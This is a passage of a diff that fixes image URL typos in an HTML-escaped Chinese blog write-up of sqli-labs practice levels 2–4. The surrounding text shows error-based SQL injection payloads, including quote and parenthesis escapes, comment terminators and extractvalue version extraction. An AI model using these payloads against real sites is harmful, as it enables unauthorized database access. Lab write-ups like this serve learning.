 &lt;p>到这就完成了利用。&lt;/p>
 &lt;h3 id="less-2-error-based-intiger">Less-2 Error-Based Intiger&lt;/h3>
 &lt;p>应该是想写 Integer。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163431103.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103.png"
 width="1047"
 height="259"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163431103_hu4953e307fbf1c472a34c054c6a959fe1_168712_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509163431103"
 class="gallery-image"
@@ -98,10 +328,10 @@ data-flex-grow="404"
 data-flex-basis="970px"
 >&lt;/p>
 &lt;p>初始提示一样，尝试&lt;code>?id=1 and 1=1&lt;/code>和&lt;code>?id=1 and 1=0&lt;/code>之后发现存在注入，提示 Error-Based，选择和上一题同样的 Payload 去掉&lt;code>'&lt;/code>可破。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163615943.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943.png"
 width="1172"
 height="351"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163615943_hucb861eaa35ba9e325d147144936c17e7_175871_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509163615943"
 class="gallery-image"
@@ -110,10 +340,10 @@ data-flex-basis="801px"
 >&lt;/p>
 &lt;h3 id="less-3-error-based-single-quotes-with-twist">Less-3 Error-Based Single-quotes with twist&lt;/h3>
 &lt;p>一样的提示。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163747743.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743.png"
 width="1028"
 height="250"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509163747743_hufb29196d55de35b2e29f46041fdaa7c4_168972_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509163747743"
 class="gallery-image"
@@ -121,10 +351,10 @@ data-flex-grow="411"
 data-flex-basis="986px"
 >&lt;/p>
 &lt;p>但这题有点不一样的地方，尝试&lt;code>?id=1' and 1=1 --%20&lt;/code>会发现依然报 SQL 语法错误。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164101687.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687.png"
 width="1171"
 height="186"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164101687_hu1c7a350e2916dc7232a6bda0d4fe60e2_15198_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509164101687"
 class="gallery-image"
@@ -132,10 +362,10 @@ data-flex-grow="629"
 data-flex-basis="1510px"
 >&lt;/p>
 &lt;p>试了下&lt;code>?id=1; -- %20&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165114088.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088.png"
 width="1252"
 height="199"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165114088_hu24d1565bb9c9e0e8bddb095dc84b19d3_16669_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165114088"
 class="gallery-image"
@@ -143,10 +373,10 @@ data-flex-grow="629"
 data-flex-basis="1509px"
 >&lt;/p>
 &lt;p>没辙了，看一眼参考答案（源码）。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164941721.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721.png"
 width="541"
 height="23"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509164941721_hu521816bd5441b58fc398dfe2943315cf_4488_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509164941721"
 class="gallery-image"
@@ -155,10 +385,10 @@ data-flex-basis="5645px"
 >&lt;/p>
 &lt;p>所以是我少给了个&lt;code>)&lt;/code>。这时候才后知后觉发现语法错误报错里已经有提示了，&lt;code>near '; -- ') LIMIT 0,1&lt;/code>，这里有个右半括号。&lt;/p>
 &lt;p>所以把第一题的 payload 改一下，&lt;code>?id=1') and extractvalue(1,concat('~',version())) --%20&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165259349.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349.png"
 width="772"
 height="203"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165259349_huc9c8b4e45e8e152ef7d5ff8942aca497_11789_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165259349"
 class="gallery-image"
@@ -168,10 +398,10 @@ data-flex-basis="912px"
 &lt;p>这关就算 pass 了。&lt;/p>
 &lt;p>教训是不要忽视细节。&lt;/p>
 &lt;h3 id="less-4-error-based-double-quotes">Less-4 Error-Based Double Quotes&lt;/h3>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165419151.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151.png"
 width="1142"
 height="367"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165419151_hu5534db053615c9fc12393954cf30e5f2_178186_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165419151"
 class="gallery-image"
@@ -179,10 +409,10 @@ data-flex-grow="311"
 data-flex-basis="746px"
 >&lt;/p>
 &lt;p>提示 &lt;code>DoubleQuotes&lt;/code>，MySQL 的字符串可以用双引号 &lt;code>&amp;quot;&lt;/code>，这里试一下 Payload &lt;code>?id=1&amp;quot; and 1=0&lt;/code>。&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165543942.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942.png"
 width="1213"
 height="209"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165543942_hu59f9092928d8be6bbbb4e4b1aead67c8_15738_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165543942"
 class="gallery-image"
@@ -190,10 +420,10 @@ data-flex-grow="580"
 data-flex-basis="1392px"
 >&lt;/p>
 &lt;p>发现有错误，从错误信息来看有个&lt;code>&amp;quot;)&lt;/code>，我们稍微改下 paylaod 再加上注释符：&lt;code>?id=1&amp;quot;) and 1=0; --%20&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165724792.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792.png"
 width="1091"
 height="314"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165724792_hu53d32bf7a774cd2b156e46910bb74362_172240_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165724792"
 class="gallery-image"
@@ -201,10 +431,10 @@ data-flex-grow="347"
 data-flex-basis="833px"
 >&lt;/p>
 &lt;p>成功，现在还是用 &lt;code>extractvalue&lt;/code> 提取信息：&lt;code>?id=1&amp;quot;) and extractvalue(1,concat('~',version())); --%20&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165834583.png"
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583.png"
 width="781"
 height="196"
-srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-traning-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_1024x0_resize_box_3.png 1024w"
+srcset="https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/sqli-labs-training-1/image-20220509165834583_hub9bad2e1cf60607ac2a12d9072aa72b6_11609_1024x0_resize_box_3.png 1024w"
 loading="lazy"
 alt="image-20220509165834583"
 class="gallery-image"
